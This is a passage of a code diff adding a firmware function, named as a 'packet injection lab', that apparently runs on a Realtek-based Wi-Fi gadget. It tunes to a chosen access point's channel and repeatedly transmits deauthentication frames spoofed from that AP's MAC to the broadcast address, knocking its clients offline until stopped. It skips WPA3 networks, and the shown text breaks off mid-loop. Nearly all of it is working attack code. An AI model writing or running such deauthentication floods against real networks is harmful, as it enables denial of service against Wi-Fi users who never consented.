@@ -1,0 +1,82 @@
+bool runPacketInjectionLab() {
+  const NetworkInfo &target = targetGet();
+
+  uint8_t targetMac[6], broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  if (!parseMacAddress(target.bssid, targetMac)) {
+    uiDrawStatus("Bad MAC address");
+    ledFlashRed(3, 100);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+
+  if (isInjectionBlockedSecurity(target.security)) {
+    uiDrawStatus("WPA3 - TX blocked");
+    ledFlashRed(2, 200);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+
+  wifi_off();
+  delay(200);
+  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
+    uiDrawStatus("WiFi init failed");
+    ledFlashRed(2, 200);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work
+  delay(200);
+
+  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
+    uiDrawStatus("Channel set failed");
+    ledFlashRed(2, 200);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+
+  uiDrawTxCounter(0);
+
+  bool anySent = false;
+  uint32_t sentCount = 0;
+  uiDrawTxCounter(sentCount);
+
+  int consecutiveFails = 0;
+
+  while (true) {
+    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
+      if (labStopRequested()) {
+        return stopPacketInjectionLab(anySent, sentCount);
+      }
+
+      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
+      anySent = anySent || sent;
+      if (sent) {
+        sentCount++;
+        consecutiveFails = 0;
+        ledFlashGreen(1, 20);
+        buzzerClick();
+      } else {
+        consecutiveFails++;
+        ledFlashRed(1, 20);
+        delay(10); // Small retry delay
+      }
+
+      uiDrawTxCounter(sentCount);
+      
+      if (consecutiveFails >= 10) {
+         uiDrawStatus("TX Failed (10x)");
+         delay(800);
+         return stopPacketInjectionLab(anySent, sentCount);
+      }
+      
+      delay(LAB_DEAUTH_TX_GAP_MS);
+      yield();
+    }
+
+    if (labStopRequested()) {
+      return stopPacketInjectionLab(anySent, sentCount);
+   
